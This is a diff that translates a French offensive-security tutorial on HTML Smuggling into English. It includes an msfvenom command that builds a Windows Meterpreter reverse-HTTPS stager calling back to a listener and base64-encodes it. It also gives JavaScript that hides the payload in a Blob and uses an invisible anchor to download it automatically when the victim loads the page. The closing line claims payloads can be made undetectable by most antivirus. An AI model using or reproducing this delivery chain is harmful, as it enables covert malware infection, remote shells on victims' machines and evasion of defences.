@@ -1,12 +1,12 @@
-### I - Explications :
+### I - Explanation  :
 
-les attaquants utiliseront souvent des méthodes de livraison plus discrètes. Par exemple, un attaquant peut intégrer un lien dans un e-mail. Lorsque la victime lit l'email et visite la page Web, le code JavaScript utilise la technique de HTML Smuggling pour sauvegarder le payload.
-la technique de HTML Smuggling utilise une combinaison de code HTML5 et de JavaScript pour introduire des fichiers malveillants tout en faisant un bypass de certaines restrictions.
+Attackers will often use more covert delivery methods. For example, an attacker may embed a link in an email. When the victim reads the email and visits the web page, the JavaScript code uses the HTML Smuggling technique to save the payload.
+The HTML Smuggling technique uses a combination of HTML5 code and JavaScript to introduce malicious files while bypassing certain restrictions.
 
 ![](https://media.discordapp.net/attachments/713142876241920000/936776589293801502/unknown.png?width=1045&height=572)
 
 
-### II - Explication du code :
+### II - Explanation of the code :
 ```html
 <html>
 	<body>
@@ -14,11 +14,11 @@ la technique de HTML Smuggling utilise une combinaison de code HTML5 et de JavaS
 	</body>
 </html>
 ```
-l'attribut de téléchargement de la balise achor d'HTML5, qui est chargé dans le navigateur pour télécharger automatiquement un fichier lorsque quelqu'un clique sur le lien hypertexte attribué.
+the download attribute of the achor tag of HTML5, which is loaded in the browser to automatically download a file when someone clicks on the assigned hyperlink.
 
-le fichier payload.exe sera téléchargé automatiquement une fois que l'utilisateurs à cliqué sur le lien. il y a pas d'interaction.
+the payload.exe file will be downloaded automatically once the user clicks on the link. there is no interaction.
 
-**1 - créer un exécutable Base64 Meterpreter et le stocker en tant que Blob à l'intérieur d'une variable JavaScript.**
+**1 - create a Base64 Meterpreter executable and store it as a Blob inside a JavaScript variable.
 ```sh
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.45 LPORT=443 -f exe > mstager.exe && base64 mstager.exe > stager.b64
 ```
@@ -29,14 +29,14 @@ var data = base64ToArrayBuffer(file);
 var blob = new Blob([data], {type: 'octet/stream'});
 ```
 
-**2  - utiliser le Blob pour la fonction createObjectURL**
+**2 - use the Blob for the createObjectURL** function
+
 ```js
 var url = window.URL.createObjectURL(blob);
 ```
 
-Enfin, nous allons créer une balise d'ancrage invisible qui déclenchera le téléchargement une fois que la victime charge la page.
-l'attribut download accepte uniquement les fichiers stockés sur un serveur Web.
-
+Finally, we will create an invisible anchor tag that will trigger the download once the victim loads the page.
+The download attribute only accepts files stored on a web server.
 ```js
 a.href = url; 
 a.download = fileName; 
@@ -46,12 +46,14 @@ window.URL.revokeObjectURL(url);
 
 
 
-**3 - code final :**
+**3 - Final Code :**
 
 ![](https://media.discordapp.net/attachments/713142876241920000/937139103827382322/carbon_3.png?width=573&height=572)
 
-### III - Démo :
+### III - Demo :
 
 ![](https://media.discordapp.net/attachments/713142876241920000/936775304234537022/smuggle.png?width=1125&height=572)
 
-**⛔ malgré que la technique soit récente et qu'elle bypass quelque protections, ce qui rend la techniques détectables c'est le payload, vous pouvez rendre votres payloads indétectable par la majorité des antivirus via diverses techniques.**
+**⛔ Although the technique is recent and bypasses some protections, what makes the technique detectable is the payload, you can make your payloads undetectable by the majority of antivirus software via various techniques.**
+
+
